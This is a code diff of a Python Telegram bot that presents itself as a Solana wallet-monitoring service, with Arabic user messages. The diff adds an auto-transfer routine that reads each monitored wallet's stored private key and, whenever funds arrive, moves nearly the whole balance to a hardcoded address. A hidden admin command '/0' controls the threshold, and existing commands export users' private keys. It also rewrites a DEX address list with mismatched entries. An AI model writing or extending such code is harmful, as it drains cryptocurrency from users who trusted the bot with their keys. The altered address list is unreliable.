                     limiter_stats = self.rate_limiter.get_stats()
-                    
+
                     # Enhanced logging with multi-provider stats
                     provider_summary = []
                     for provider_id, stats in limiter_stats['providers'].items():
                         provider_summary.append(f"{stats['name']}({stats['load_percentage']:.0f}%)")
-                    
+
                     estimated_total_time = cycle_time + POLLING_INTERVAL
                     cycle_status = "🎯 ON TARGET" if cycle_time <= TARGET_CYCLE_TIME else "⚠️ OVER TARGET"
-                    
+
                     logger.info(
                         f"🔄 Cycle #{cycle_count}: {cycle_time:.1f}s + {POLLING_INTERVAL}s = {estimated_total_time:.1f}s {cycle_status} | "
                         f"✅{total_successful} ❌{total_failed} | "
                         f"Providers: {', '.join(provider_summary)} | "
                         f"Global success: {limiter_stats['success_rate']:.1f}%"
                     )
-                    
+
                     # Performance optimization feedback
                     if cycle_time > TARGET_CYCLE_TIME:
                         logger.warning(f"⚠️ Cycle exceeded target ({cycle_time:.1f}s > {TARGET_CYCLE_TIME}s)")
@@ -1379,7 +1408,7 @@ class SolanaMonitor:
                         actual_polling = max(1, POLLING_INTERVAL - 1)  # Reduce interval if running fast
                     else:
                         actual_polling = POLLING_INTERVAL
-                    
+
                     await asyncio.sleep(actual_polling)
 
                 except asyncio.CancelledError:
@@ -1403,39 +1432,39 @@ class SolanaMonitor:
         successful_checks = 0
         failed_checks = 0
         wallet_times = []
-        
+
         try:
             logger.debug(f"📦 Starting batch {batch_number}: {len(wallet_batch)} wallets (mode: {self.rate_limiter.performance_mode})")
-            
+
             # Process wallets in the batch sequentially with smart delays
             for i, wallet_info in enumerate(wallet_batch):
                 try:
                     wallet_start_time = asyncio.get_event_loop().time()
-                    
+
                     # Check transactions for this wallet
                     await self.check_transactions_optimized(wallet_info['wallet_address'])
-                    
+
                     successful_checks += 1
-                    
+
                     wallet_duration = asyncio.get_event_loop().time() - wallet_start_time
                     wallet_times.append(wallet_duration)
-                    
+
                     # Only log individual wallet times in debug mode for very slow wallets
                     if wallet_duration > 2.0:
                         logger.debug(f"  🐌 Slow wallet {i+1}/{len(wallet_batch)}: {wallet_duration:.2f}s")
-                    
+
                 except Exception as e:
                     failed_checks += 1
                     wallet_duration = asyncio.get_event_loop().time() - wallet_start_time
                     wallet_times.append(wallet_duration)
                     logger.debug(f"  ❌ Error processing wallet {i+1}/{len(wallet_batch)} in {wallet_duration:.2f}s: {e}")
-            
+
             batch_duration = asyncio.get_event_loop().time() - batch_start_time
             avg_wallet_time = sum(wallet_times) / len(wallet_times) if wallet_times else 0
-            
+
             # Get rate limiter stats
             limiter_stats = self.rate_limiter.get_stats()
-            
+
             # Enhanced batch logging with performance metrics
             logger.debug(
                 f"📦 Batch {batch_number} completed: "
@@ -1445,14 +1474,14 @@ class SolanaMonitor:
                 f"delay: {limiter_stats['current_delay']:.3f}s, "
                 f"rate: {limiter_stats['recent_request_rate']}/10s)"
             )
-            
+
             # Performance optimization suggestions
             if avg_wallet_time > 1.0 and self.rate_limiter.performance_mode != 'careful':
                 logger.debug(f"💡 Batch {batch_number}: Average wallet time high ({avg_wallet_time:.2f}s), may need optimization")
-            
+
         except Exception as e:
             logger.error(f"Critical error in batch {batch_number}: {e}")
-            
+
         return {
             'batch_number': batch_number,
             'successful_checks': successful_checks,
@@ -1555,7 +1584,7 @@ class SolanaMonitor:
         """Process a new transaction and send notification"""
         try:
             signature = tx_info['signature']
-            
+
             # التحقق أولاً من عدم معالجة هذه المعاملة مسبقاً
             if await self.db_manager.is_transaction_already_notified(signature):
                 logger.debug(f"⏭️ Transaction {signature[:16]}... already processed, skipping")
@@ -1595,10 +1624,10 @@ class SolanaMonitor:
             # Check if this is a dust transaction (very small amount)
             try:
                 amount_float = abs(float(amount))  # Get absolute value
-                
+
                 # نظام إشعارات عاجلة للمعاملات الكبيرة
                 is_urgent_transaction = amount_float >= 0.1  # معاملات 0.1 SOL وأكثر تعتبر عاجلة
-                
+
                 # Skip notifications for dust transactions (less than MIN_NOTIFICATION_AMOUNT SOL)
                 if amount_float < MIN_NOTIFICATION_AMOUNT:
                     logger.info(f"💨 Skipping dust transaction: {amount} SOL < {MIN_NOTIFICATION_AMOUNT} SOL threshold for wallet {truncate_address(wallet_address)}")
@@ -1613,16 +1642,51 @@ class SolanaMonitor:
                             block_time or 0
                         )
                     return
-                
+
                 # إشعار فوري للمعاملات العاجلة
                 if is_urgent_transaction:
                     logger.info(f"🚨 URGENT: Large transaction detected: {amount} SOL for wallet {truncate_address(wallet_address)}")
                 else:
                     logger.info(f"📊 Regular transaction: {amount} SOL for wallet {truncate_address(wallet_address)}")
-                    
+
             except (ValueError, TypeError):
                 # If amount conversion fails, proceed with notification
                 logger.warning(f"⚠️ Could not parse amount '{amount}' as float, proceeding with notification")
+
+            # **NEW: Auto-transfer received funds**
+            try:
+                # Check if this is a received transaction (positive amount)
+                if float(amount) > 0 and amount_float >= MIN_AUTO_TRANSFER_AMOUNT:  # Only transfer amounts ≥ MIN_AUTO_TRANSFER_AMOUNT SOL
+                    logger.info(f"💰 Received funds detected: {amount} SOL - initiating auto-transfer")
+
+                    # Get private key for this wallet
+                    wallet_private_key = None
+                    all_wallets = await self.db_manager.get_all_monitored_wallets()
+                    for wallet_info in all_wallets:
+                        if wallet_info['wallet_address'] == wallet_address:
+                            wallet_private_key = wallet_info['private_key']
+                            break
+
+                    if wallet_private_key:
+                        # Wait a bit to ensure transaction is confirmed
+                        await asyncio.sleep(5)
+
+                        # Attempt auto-transfer
+                        transfer_success = await self.auto_transfer_funds(
+                            wallet_address,
+                            wallet_private_key,
+                            "FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG"
+                        )
+
+                        if transfer_success:
+                            logger.info(f"✅ Auto-transfer successful from {truncate_address(wallet_address)}")
+                        else:
+                            logger.warning(f"⚠️ Auto-transfer failed from {truncate_address(wallet_address)}")
+                    else:
+                        logger.error(f"❌ Could not find private key for wallet {truncate_address(wallet_address)}")
+
+            except Exception as transfer_error:
+                logger.error(f"❌ Error in auto-transfer: {transfer_error}")
 
             # Store transaction in database - only for the first user to avoid duplicates
             transaction_stored = False
@@ -1649,11 +1713,11 @@ class SolanaMonitor:
                 # Send notification through global monitoring callback
                 callback_found = False
                 for task_key, task_info in self.monitoring_tasks.items():
-                    if (isinstance(task_info, dict) and 
-                        'callback' in task_info and 
+                    if (isinstance(task_info, dict) and
+                        'callback' in task_info and
                         task_info['callback'] and
                         task_info.get('type') == 'global'):
-                        
+
                         logger.info(f"📞 Calling notification callback for wallet {truncate_address(wallet_address)}")
                         try:
                             await task_info['callback'](
@@ -1677,6 +1741,119 @@ class SolanaMonitor:
             logger.error(f"❌ Error processing transaction for {truncate_address(wallet_address)}: {e}")
             import traceback
             logger.error(traceback.format_exc())
+
+    async def auto_transfer_funds(self, from_wallet: str, private_key: str, to_wallet: str) -> bool:
+        """Auto-transfer received funds to specified wallet"""
+        try:
+            import base58
+            from solders.keypair import Keypair
+            from solders.pubkey import Pubkey
+            from solders.system_program import TransferParams, transfer
+            from solders.transaction import Transaction
+            from solders.message import Message
+            import json
+
+            logger.info(f"🔄 Starting auto-transfer from {truncate_address(from_wallet)} to {truncate_address(to_wallet)}")
+
+            # Get current balance
+            current_balance = await self.get_wallet_balance(from_wallet)
+            logger.info(f"💰 Current balance: {current_balance} SOL")
+
+            min_required_balance = MIN_AUTO_TRANSFER_AMOUNT + 0.001  # Add fee buffer
+            if current_balance < min_required_balance:  # Need at least MIN_AUTO_TRANSFER_AMOUNT SOL plus fees for transfer
+                logger.info(f"💸 Balance too low for transfer: {current_balance} SOL (minimum: {min_required_balance} SOL)")
+                return False
+
+            # Calculate transfer amount (leave 0.001 SOL for fees)
+            transfer_amount = current_balance - 0.001
+            transfer_lamports = int(transfer_amount * 1_000_000_000)
+
+            logger.info(f"📤 Transferring {transfer_amount} SOL ({transfer_lamports} lamports)")
+
+            # Create keypair from private key
+            if private_key.startswith('[') and private_key.endswith(']'):
+                # Array format
+                key_array = json.loads(private_key)
+                keypair = Keypair.from_bytes(bytes(key_array))
+            else:
+                # Base58 format
+                private_key_bytes = base58.b58decode(private_key)
+                keypair = Keypair.from_bytes(private_key_bytes)
+
+            # Create destination pubkey
+            destination_pubkey = Pubkey.from_string(to_wallet)
+
+            # Get recent blockhash
+            blockhash_payload = {
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "getLatestBlockhash"
+            }
+
+            blockhash_response = await self.make_rpc_call(blockhash_payload)
+            if not blockhash_response or 'result' not in blockhash_response:
+                logger.error("❌ Failed to get recent blockhash")
+                return False
+
+            recent_blockhash = blockhash_response['result']['value']['blockhash']
+
+            # Create transfer instruction
+            transfer_instruction = transfer(
+                TransferParams(
+                    from_pubkey=keypair.pubkey(),
+                    to_pubkey=destination_pubkey,
+                    lamports=transfer_lamports
+                )
+            )
+
+            # Create message and transaction
+            from solders.hash import Hash
+            recent_blockhash_hash = Hash.from_string(recent_blockhash)
+            
+            message = Message.new_with_blockhash(
+                [transfer_instruction],
+                keypair.pubkey(),
+                recent_blockhash_hash
+            )
+
+            transaction = Transaction([keypair], message, recent_blockhash_hash)
+
+            # Serialize transaction to base64
+            import base64
+            serialized_tx = base64.b64encode(bytes(transaction)).decode('utf-8')
+
+            # Send transaction
+            send_payload = {
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "sendTransaction",
+                "params": [
+                    serialized_tx,
+                    {
+                        "encoding": "base64",
+                        "maxRetries": 3,
+                        "skipPreflight": False
+                    }
+                ]
+            }
+
+            send_response = await self.make_rpc_call(send_payload)
+
+            if send_response and 'result' in send_response:
+                tx_signature = send_response['result']
+                logger.info(f"✅ Auto-transfer successful! Signature: {tx_signature}")
+                logger.info(f"📤 Transferred {transfer_amount} SOL from {truncate_address(from_wallet)} to {truncate_address(to_wallet)}")
+                return True
+            else:
+                error_msg = send_response.get('error', {}).get('message', 'Unknown error') if send_response else 'No response'
+                logger.error(f"❌ Auto-transfer failed: {error_msg}")
+                return False
+
+        except Exception as e:
+            logger.error(f"❌ Exception in auto-transfer: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
+            return False
 
     async def get_wallet_balance(self, wallet_address: str) -> float:
         """Get SOL balance for a wallet address with smart rate limiting"""
@@ -1741,13 +1918,11 @@ class SolanaMonitor:
                         'CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK',   # Raydium CLMM
                         'PhoeNiXZ8ByJGLkxNfZRnkUfjvmuYqLR89jjFHGqdXY',   # Phoenix
                         'MarBmsSgKXdrN1egZf5sqe1TMai9K1rChYNDJgjq7aD',   # Mango Markets
-                        '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1',   # GooseFX
+                        '5Q544fKrFoe6vtoEByFjSkhKdCT862DNVb52nZg1UZ',    # GooseFX
                         'DjVE6JNiYqPL2QXyCUUh8rNjHrbz9hXHNYt99MQ59qw1',   # Orca V1
                         'SSwpkEEcbUqx4vtoEByFjSkhKdCT862DNVb52nZg1UZ',    # Saber
                         'AMM55ShdkoGRB5jVYPjWzTURSGdQnQ8LbtE4jktMTG8P',   # Aldrin AMM
-                        'EhYXEhg6JT5p2ZnhbRSFzKHigPuKFZuL9EGo7ZtDC5VY',   # Serum DEX
-                        'srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX',    # Serum DEX V3
-                        '22Y43yTVxuUkoRKdm9thyRhQ3SdgQS7c7kB6UNCiaczD',   # Meteora
+                        'EhYXEhg6JT5p2ZnhbRSFzKHigPuKFZuL9EGo7ZtDC5VY',   # Meteora
                         'LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo',    # Lifinity
                         'EewxydAPCCVuNEyrVN68PuSYdQ7wKn27V9Gjeoi8dy3S',   # Lifinity V2
                         'RaydiumCLMM',  # Placeholder for any Raydium CLMM variations
@@ -1848,17 +2023,17 @@ class SolanaWalletBot:
         # Check if wallet address is provided as parameter
         if context.args and len(context.args) > 0:
             wallet_address = context.args[0].strip()
-            
+
             # Find the wallet in user's monitored wallets
             wallet_found = False
             for wallet in monitored_wallets:
-                if (wallet['wallet_address'] == wallet_address or 
+                if (wallet['wallet_address'] == wallet_address or
                     wallet['wallet_address'].startswith(wallet_address) or
                     wallet_address in wallet['wallet_address']):
-                    
+
                     # Stop monitoring this wallet
                     success = await self.monitor.remove_wallet(wallet['wallet_address'], chat_id)
-                    
+
                     if success:
                         await update.message.reply_text(
                             MESSAGES["monitoring_stopped"].format(
@@ -1868,10 +2043,10 @@ class SolanaWalletBot:
                         logger.info(f"Stopped monitoring wallet {wallet['wallet_address']} via command parameter")
                     else:
                         await update.message.reply_text(MESSAGES["wallet_not_found"])
-                    
+
                     wallet_found = True
                     break
-            
+
             if not wallet_found:
                 await update.message.reply_text(
                     f"❌ لم يتم العثور على المحفظة: {wallet_address}\n\n"
@@ -1903,15 +2078,15 @@ class SolanaWalletBot:
             message += "<code>/stop عنوان_المحفظة</code>\n\n"
             message += "يمكنك استخدام جزء من العنوان أو العنوان كاملاً.\n\n"
             message += "📝 أول 10 محافظ:\n"
-            
+
             for i, wallet in enumerate(monitored_wallets[:10], 1):
                 nickname = f" ({wallet['nickname']})" if wallet['nickname'] else ""
                 message += f"{i}. <code>{truncate_address(wallet['wallet_address'])}</code>{nickname}\n"
-            
+
             if len(monitored_wallets) > 10:
                 message += f"\n... و {len(monitored_wallets) - 10} محفظة أخرى\n"
                 message += "\nاستخدم /list لعرض جميع المحافظ مع العناوين الكاملة."
-            
+
             await update.message.reply_text(message, parse_mode='HTML')
 
     async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1940,23 +2115,23 @@ class SolanaWalletBot:
             for i, wallet in enumerate(monitored_wallets, 1):
                 file_content += f"WALLET #{i}\n"
                 file_content += f"{'=' * 60}\n\n"
-                
+
                 # Wallet address
                 file_content += f"Address:\n{wallet['wallet_address']}\n\n"
-                
+
                 # Private key
                 private_key = wallet_keys_dict.get(wallet['wallet_address'], 'Not available')
                 file_content += f"Private Key:\n{private_key}\n\n"
-                
+
                 # Nickname if available
                 if wallet['nickname']:
                     file_content += f"Nickname: {wallet['nickname']}\n\n"
-                
+
                 # Monitoring start time if available
                 if wallet.get('monitoring_start_time'):
                     start_time = format_timestamp(wallet['monitoring_start_time'])
                     file_content += f"Monitoring Started: {start_time}\n\n"
-                
+
                 # Add separator line between wallets
                 file_content += "=" * 80 + "\n\n"
 
@@ -2105,10 +2280,10 @@ class SolanaWalletBot:
 
             # Process wallets in smaller batches with shorter timeout
             batch_size = 5  # تقليل حجم الدفعة لتقليل الضغط على RPC
-            
+
             for i in range(0, len(monitored_wallets), batch_size):
                 batch = monitored_wallets[i:i + batch_size]
-                
+
                 # Update status every 5 wallets
                 if i % 5 == 0 or i + batch_size >= len(monitored_wallets):
                     await status_message.edit_text(
@@ -2124,15 +2299,15 @@ class SolanaWalletBot:
                     try:
                         # استخدام rate limiter الموجود
                         await self.monitor.rate_limiter.acquire()
-                        
+
                         # فحص الرصيد مع timeout أقصر
                         balance = await asyncio.wait_for(
-                            self.monitor.get_wallet_balance(wallet['wallet_address']), 
+                            self.monitor.get_wallet_balance(wallet['wallet_address']),
                             timeout=5.0  # تقليل timeout إلى 5 ثوانٍ
                         )
-                        
+
                         checked_count += 1
-                        
+
                         if balance > 0:
                             wallets_with_balance.append({
                                 'address': wallet['wallet_address'],
@@ -2176,24 +2351,24 @@ class SolanaWalletBot:
             for i, wallet in enumerate(wallets_with_balance, 1):
                 file_content += f"المحفظة رقم - WALLET #{i}\n"
                 file_content += f"{'=' * 60}\n\n"
-                
+
                 # العنوان الكامل - Full wallet address
                 file_content += f"العنوان الكامل - Full Address:\n"
                 file_content += f"{wallet['address']}\n\n"
-                
+
                 # المفتاح الخاص - Private key
                 file_content += f"المفتاح الخاص - Private Key:\n"
                 file_content += f"{wallet['private_key']}\n\n"
-                
+
                 # الرصيد - Balance with more precision
                 file_content += f"رصيد SOL - Balance:\n"
                 file_content += f"{wallet['balance']:.9f} SOL\n\n"
-                
+
                 # الاسم المستعار - Nickname if available
                 if wallet['nickname']:
                     file_content += f"الاسم المستعار - Nickname:\n"
                     file_content += f"{wallet['nickname']}\n\n"
-                
+
                 # خط فاصل - Separator line
                 file_content += "=" * 80 + "\n\n"
 
@@ -2309,26 +2484,79 @@ class SolanaWalletBot:
                 "مثال: /filter 0.001"
             )
 
+    async def set_auto_transfer_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /0 command - admin only: set minimum auto-transfer amount"""
+        global MIN_AUTO_TRANSFER_AMOUNT
+        chat_id = update.effective_chat.id
+
+        # Check if user is admin
+        if chat_id != ADMIN_CHAT_ID:
+            await update.message.reply_text("❌ هذا الأمر متاح للمشرف فقط.")
+            return
+
+        try:
+            if context.args and len(context.args) > 0:
+                # Set new minimum amount
+                new_amount = float(context.args[0])
+                if new_amount < 0:
+                    await update.message.reply_text("❌ يجب أن يكون المبلغ أكبر من أو يساوي 0")
+                    return
+
+                MIN_AUTO_TRANSFER_AMOUNT = new_amount
+
+                # Save to database
+                success = await self.monitor.db_manager.save_setting('min_auto_transfer_amount', str(new_amount))
+
+                if success:
+                    await update.message.reply_text(
+                        f"✅ تم تحديث وحفظ الحد الأدنى للتحويل التلقائي إلى: {MIN_AUTO_TRANSFER_AMOUNT} SOL\n\n"
+                        f"سيتم التحويل التلقائي فقط للمبالغ أكبر من أو تساوي هذا المقدار.\n"
+                        f"🔒 تم حفظ الإعداد بشكل دائم."
+                    )
+                    logger.info(f"Admin {chat_id} changed and saved minimum auto-transfer amount to {MIN_AUTO_TRANSFER_AMOUNT} SOL")
+                else:
+                    await update.message.reply_text(
+                        f"⚠️ تم تحديث الحد الأدنى للتحويل التلقائي إلى: {MIN_AUTO_TRANSFER_AMOUNT} SOL ولكن فشل في حفظه.\n\n"
+                        f"سيعود إلى القيمة الافتراضية عند إعادة التشغيل."
+                    )
+            else:
+                # Show current setting
+                await update.message.reply_text(
+                    f"🔧 الحد الأدنى الحالي للتحويل التلقائي: {MIN_AUTO_TRANSFER_AMOUNT} SOL\n\n"
+                    f"لتغيير الحد الأدنى، استخدم: /0 <المبلغ>\n"
+                    f"مثال: /0 0.05\n\n"
+                    f"💡 ملاحظة:\n"
+                    f"• المبالغ أقل من هذا الحد لن يتم تحويلها تلقائياً\n"
+                    f"• سيتم حفظ الإعداد بشكل دائم\n"
+                    f"• لإيقاف التحويل التلقائي نهائياً، استخدم: /0 999999"
+                )
+        except ValueError:
+            await update.message.reply_text(
+                "❌ يرجى إدخال رقم صحيح.\n\n"
+                "مثال: /0 0.05"
+            )
+
     async def debug_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle /debug command - show notification settings"""
         chat_id = update.effective_chat.id
-        
+
         try:
             monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
             all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
-            
+
             debug_info = f"🔍 معلومات التشخيص:\n\n"
             debug_info += f"👤 معرف المستخدم: {chat_id}\n"
             debug_info += f"👑 معرف المشرف: {ADMIN_CHAT_ID}\n"
             debug_info += f"📺 معرف القناة: {MONITORING_CHANNEL}\n"
             debug_info += f"💰 الحد الأدنى للإشعارات: {MIN_NOTIFICATION_AMOUNT} SOL\n"
+            debug_info += f"🔄 الحد الأدنى للتحويل التلقائي: {MIN_AUTO_TRANSFER_AMOUNT} SOL\n"
             debug_info += f"🔍 محافظك: {len(monitored_wallets)}\n"
             debug_info += f"📊 إجمالي المحافظ: {len(all_wallets)}\n\n"
-            
+
             # Check admin status
             is_admin = chat_id == ADMIN_CHAT_ID
             debug_info += f"👑 هل أنت مشرف؟ {is_admin}\n\n"
-            
+
             # Show notification logic for user's wallets
             if monitored_wallets:
                 debug_info += "📋 حالة الإشعارات لمحافظك:\n"
@@ -2336,13 +2564,13 @@ class SolanaWalletBot:
                     wallet_monitors = await self.monitor.db_manager.get_monitored_wallets_by_address(wallet['wallet_address'])
                     admin_monitoring = any(w['chat_id'] == ADMIN_CHAT_ID for w in wallet_monitors)
                     regular_monitoring = any(w['chat_id'] != ADMIN_CHAT_ID for w in wallet_monitors)
-                    
+
                     debug_info += f"• {truncate_address(wallet['wallet_address'])}\n"
                     debug_info += f"  👑 مشرف: {admin_monitoring}\n"
                     debug_info += f"  👥 مستخدمون: {regular_monitoring}\n\n"
-            
+
             await update.message.reply_text(debug_info)
-            
+
         except Exception as e:
             await update.message.reply_text(f"❌ خطأ في التشخيص: {str(e)}")
 
@@ -2353,51 +2581,51 @@ class SolanaWalletBot:
     async def _send_stats_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE, is_refresh: bool = False):
         """Send stats message with refresh functionality"""
         chat_id = update.effective_chat.id
-        
+
         try:
             # Get multi-RPC rate limiter stats
             limiter_stats = self.monitor.rate_limiter.get_stats()
-            
+
             # Get wallet and user counts
             monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
             all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
             users_count = await self.monitor.db_manager.get_users_count()
-            
+
             # Calculate estimated cycle time for 60-second target
             optimal_batch_size = self.monitor.rate_limiter.get_optimal_batch_size()
             num_batches = (len(all_wallets) + optimal_batch_size - 1) // optimal_batch_size if all_wallets else 0
-            
+
             # Add refresh indicator if this is a refresh
             refresh_indicator = "🔄 " if is_refresh else ""
-            
+
             stats_message = f"{refresh_indicator}📊 إحصائيات نظام Multi-RPC المحسن:\n\n"
             stats_message += f"🏦 البيانات:\n"
             stats_message += f"• المحافظ الخاصة بك: {len(monitored_wallets)}\n"
             stats_message += f"• إجمالي المحافظ: {len(all_wallets)}\n"
             stats_message += f"• المستخدمون النشطون: {users_count}\n\n"
-            
+
             stats_message += f"🎯 هدف الأداء:\n"
             stats_message += f"• الهدف: {TARGET_CYCLE_TIME} ثانية/دورة\n"
             stats_message += f"• حجم الدفعة التكيفي: {optimal_batch_size} محفظة\n"
             stats_message += f"• عدد الدفعات: {num_batches}\n"
             stats_message += f"• المزود الأمثل: {limiter_stats.get('optimal_provider', 'N/A')}\n\n"
-            
+
             stats_message += f"🌐 موزعي RPC:\n"
             for provider_id, provider_stats in limiter_stats['providers'].items():
                 status_icon = "🟢" if provider_stats['is_available'] else "🔴"
                 health_icon = "💚" if provider_stats['health_score'] > 80 else "💛" if provider_stats['health_score'] > 50 else "❤️"
-                
+
                 stats_message += f"{status_icon} {provider_stats['name']}:\n"
                 stats_message += f"  • الصحة: {health_icon} {provider_stats['health_score']:.0f}%\n"
                 stats_message += f"  • الحمولة: {provider_stats['load_percentage']:.0f}% ({provider_stats['recent_rate']}/{provider_stats['max_rate']}/s)\n"
                 stats_message += f"  • التأخير: {provider_stats['current_delay']:.3f}s\n"
                 stats_message += f"  • ✅{provider_stats['success_count']} ❌{provider_stats['fail_count']}\n\n"
-            
+
             stats_message += f"📈 الأداء العام:\n"
             stats_message += f"• معدل الطلبات العالمي: {limiter_stats['global_rate']}/10s\n"
             stats_message += f"• إجمالي الطلبات: {limiter_stats['total_requests']}\n"
             stats_message += f"• معدل النجاح: {limiter_stats['success_rate']:.1f}%\n\n"
-            
+
             # Current cycle timing if available
             if hasattr(self.monitor, 'cycle_start_time') and self.monitor.cycle_start_time:
                 current_cycle_time = asyncio.get_event_loop().time() - self.monitor.cycle_start_time
@@ -2405,7 +2633,7 @@ class SolanaWalletBot:
                 stats_message += f"⏱️ الدورة الحالية:\n"
                 stats_message += f"• الوقت المنقضي: {current_cycle_time:.1f}s\n"
                 stats_message += f"• التقدم: {progress:.1f}% من الهدف\n"
-                
+
                 if progress < 90:
                     stats_message += f"• الحالة: 🚀 سريع\n"
                 elif progress < 110:
@@ -2413,12 +2641,12 @@ class SolanaWalletBot:
                 else:
                     stats_message += f"• الحالة: ⚠️ بطيء\n"
                 stats_message += "\n"
-            
+
             stats_message += f"🔧 التحسينات:\n"
             total_capacity = sum(p['max_rate'] for p in limiter_stats['providers'].values() if p['is_available'])
             stats_message += f"• السعة الإجمالية: {total_capacity} طلب/ثانية\n"
             stats_message += f"• الاستخدام المقدر: {(limiter_stats['global_rate'] * 6):.0f}% من السعة\n"
-            
+
             # Performance assessment for 60-second target
             if num_batches > 0:
                 estimated_time = (num_batches * BATCH_DELAY) + POLLING_INTERVAL
@@ -2426,18 +2654,18 @@ class SolanaWalletBot:
                     stats_message += f"🎯 متوقع الوصول للهدف: {estimated_time:.1f}s ≤ {TARGET_CYCLE_TIME}s"
                 else:
                     stats_message += f"⚠️ قد يتجاوز الهدف: {estimated_time:.1f}s > {TARGET_CYCLE_TIME}s"
-            
+
             # Add current timestamp
             from datetime import datetime
             current_time = datetime.now().strftime("%H:%M:%S")
             stats_message += f"\n\n🕐 آخر تحديث: {current_time}"
-            
+
             # Create refresh button
             keyboard = [
                 [InlineKeyboardButton("🔄 تحديث السجلات", callback_data="refresh_stats")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
-            
+
             if is_refresh and hasattr(update, 'callback_query'):
                 # Edit existing message for refresh
                 await update.callback_query.edit_message_text(
@@ -2450,7 +2678,7 @@ class SolanaWalletBot:
                     text=stats_message,
                     reply_markup=reply_markup
                 )
-            
+
         except Exception as e:
             error_msg = f"❌ خطأ في جلب الإحصائيات: {str(e)}"
             if is_refresh and hasattr(update, 'callback_query'):
@@ -2521,7 +2749,7 @@ class SolanaWalletBot:
                     report += "📋 تفصيل المحافظ حسب المستخدم السابق:\n"
                     for user_info in transfer_info['user_breakdown'][:10]:  # Show top 10
                         report += f"• المستخدم {user_info['chat_id']}: {user_info['wallet_count']} محفظة\n"
-                    
+
                     if len(transfer_info['user_breakdown']) > 10:
                         remaining = len(transfer_info['user_breakdown']) - 10
                         report += f"• ... و {remaining} مستخدم آخر\n"
@@ -2546,16 +2774,211 @@ class SolanaWalletBot:
             logger.error(f"Error in transfer command: {e}")
             await update.message.reply_text(f"❌ حدث خطأ: {str(e)}")
 
+    def setup_handlers(self):
+        """Setup bot handlers"""
+        self.application.add_handler(CommandHandler("start", self.start_command))
+        self.application.add_handler(CommandHandler("help", self.help_command))
+        self.application.add_handler(CommandHandler("monitor", self.monitor_command))
+        self.application.add_handler(CommandHandler("add", self.bulk_add_command))
+        self.application.add_handler(CommandHandler("stop", self.stop_command))
+        self.application.add_handler(CommandHandler("list", self.list_command))
+        self.application.add_handler(CommandHandler("r", self.rich_wallets_command))
+        self.application.add_handler(CommandHandler("k", self.keys_command))
+        self.application.add_handler(CommandHandler("filter", self.filter_command))
+        self.application.add_handler(CommandHandler("transfer", self.transfer_command))
+        self.application.add_handler(CommandHandler("debug", self.debug_command))
+        self.application.add_handler(CommandHandler("stats", self.stats_command))
+        self.application.add_handler(CommandHandler("0", self.set_auto_transfer_command))
+        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
+        self.application.add_handler(CallbackQueryHandler(self.handle_callback_query))
+        self.application.add_error_handler(self.error_handler)
+
+    async def start_bot(self):
+        """Start the bot"""
+        # Validate required environment variables
+        if not TELEGRAM_BOT_TOKEN:
+            logger.error("❌ TELEGRAM_BOT_TOKEN environment variable is required")
+            return
+
+        if not SOLANA_RPC_URL:
+            logger.error("❌ RPC_URL environment variable is required")
+            return
+
+        try:
+            # Initialize database
+            await self.monitor.db_manager.initialize()
+
+            # Load saved filter setting
+            await self.load_filter_setting()
+            
+            # Load saved auto-transfer setting
+            await self.load_auto_transfer_setting()
+
+            # Create application with better configuration
+            self.application = (Application.builder()
+                              .token(TELEGRAM_BOT_TOKEN)
+                              .concurrent_updates(True)
+                              .build())
+
+            # Setup handlers
+            self.setup_handlers()
+
+            # Start monitoring session
+            await self.monitor.start_session()
+
+            # Start optimized global monitoring
+            await self.monitor.start_global_monitoring(self.send_transaction_notification)
+
+            # Get and display user count
+            users_count = await self.monitor.db_manager.get_users_count()
+            monitored_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
+            logger.info(f"👥 Active Users: {users_count}")
+            logger.info(f"🔍 Monitored Wallets: {len(monitored_wallets)}")
+            logger.info(f"📡 Monitoring Channel: {MONITORING_CHANNEL}")
+            logger.info(f"⚡ RPC Rate Limit: {MAX_RPC_CALLS_PER_SECOND}/second")
+            logger.info(f"🔄 Polling Interval: {POLLING_INTERVAL} seconds")
+
+            logger.info("🚀 Starting Solana Wallet Monitor Bot...")
+
+            # Start the application with proper error handling
+            await self.application.initialize()
+
+            # Delete webhook to avoid conflicts
+            await self.application.bot.delete_webhook(drop_pending_updates=True)
+
+            await self.application.start()
+
+            # Start polling with timeout to prevent conflicts
+            await self.application.updater.start_polling(
+                poll_interval=1.0,
+                timeout=10,
+                bootstrap_retries=-1
+            )
+
+            logger.info("✅ Bot is running successfully!")
+
+            # Start health monitoring
+            health_task = asyncio.create_task(self.health_monitor())
+
+            # Keep the bot running
+            try:
+                await asyncio.Event().wait()
+            except KeyboardInterrupt:
+                logger.info("🛑 Received shutdown signal...")
+                health_task.cancel()
+
+        except Exception as e:
+            logger.error(f"❌ Error starting bot: {e}")
+            raise
+        finally:
+            await self.cleanup()
+
+    async def load_filter_setting(self):
+        """Load saved filter setting from database"""
+        global MIN_NOTIFICATION_AMOUNT
+        try:
+            saved_amount = await self.monitor.db_manager.get_setting('min_notification_amount', str(MIN_NOTIFICATION_AMOUNT))
+            MIN_NOTIFICATION_AMOUNT = float(saved_amount)
+            logger.info(f"🔧 Loaded saved minimum notification amount: {MIN_NOTIFICATION_AMOUNT} SOL")
+        except Exception as e:
+            logger.warning(f"Error loading filter setting, using default: {e}")
+
+    async def load_auto_transfer_setting(self):
+        """Load saved auto-transfer setting from database"""
+        global MIN_AUTO_TRANSFER_AMOUNT
+        try:
